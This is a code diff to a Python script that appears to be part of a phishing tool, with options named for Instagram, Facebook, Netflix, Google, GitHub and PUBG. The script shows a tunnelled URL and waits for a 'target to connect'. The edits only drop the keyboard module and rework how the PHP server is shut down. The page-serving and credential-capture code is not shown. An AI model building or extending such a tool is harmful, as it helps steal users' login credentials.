@@ -11,7 +11,6 @@ if os.name == "nt":
         from colorama import Fore , init; init()
         import win32gui, win32con
         import pandas as pd
-        import keyboard
         
     except ImportError or ModuleNotFoundError:
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
@@ -26,7 +25,6 @@ else:
     try:
         from colorama import Fore , init; init()
         import pandas as pd
-        import keyboard
         
     except ImportError or ModuleNotFoundError:
         install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
@@ -155,8 +153,8 @@ def instagram():
 
 
 #====================================================================================================
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    file = open("localhost.txt" , "r")
+    print(file.readline(22))
     
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
@@ -228,14 +226,7 @@ def instagram():
 
                 break
 
-    try:
-        print(Fore.RED  + "\nPress Esc to Exit..." + Fore.RESET)
-        keyboard.wait("esc")
-
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-    except KeyboardInterrupt:
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
+        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 
@@ -332,17 +323,9 @@ def facebook():
 
                 break
 
-    try:
-        print(Fore.RED  + "\nPress Esc to Exit..." + Fore.RESET)
-        keyboard.wait("esc")
-
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-    except KeyboardInterrupt:
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-
-
+    subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+    sys.exit()
+  
 #option 3 ====================================================================================================
 def netflix():
     global port
@@ -437,16 +420,8 @@ def netflix():
 
                 break
 
-    try:
-        print(Fore.RED  + "\nPress Esc to Exit..." + Fore.RESET)
-        keyboard.wait("esc")
-
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-    except KeyboardInterrupt:
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-
+    subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL ,shell=True)
+    sys.exit()
 
 
 #option 4====================================================================================================
@@ -544,17 +519,9 @@ def Google():
 
                 break
 
-    try:
-        print(Fore.RED  + "\nPress Esc to Exit..." + Fore.RESET)
-        keyboard.wait("esc")
-
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
+        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell= True)
         sys.exit()
-    except KeyboardInterrupt:
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-
-
+   
 #option 5 ====================================================================================================
 def Github():
     global port
@@ -651,14 +618,8 @@ def Github():
 
                 break
 
-    try:
-        print(Fore.RED  + "\nPress Esc to Exit..." + Fore.RESET)
-        keyboard.wait("esc")
-
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-    except KeyboardInterrupt:
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
+    
+        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
 
 #option 6 ====================================================================================================
@@ -758,16 +719,9 @@ def Pubg():
 
                 break
 
-    try:
-        print(Fore.RED  + "\nPress Esc to Exit..." + Fore.RESET)
-        keyboard.wait("esc")
-
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
+        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
-    except KeyboardInterrupt:
-        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL)
-        sys.exit()
-
+    
 #Run functions ====================================================================================================
 if ask == "0":
     zero_exit()
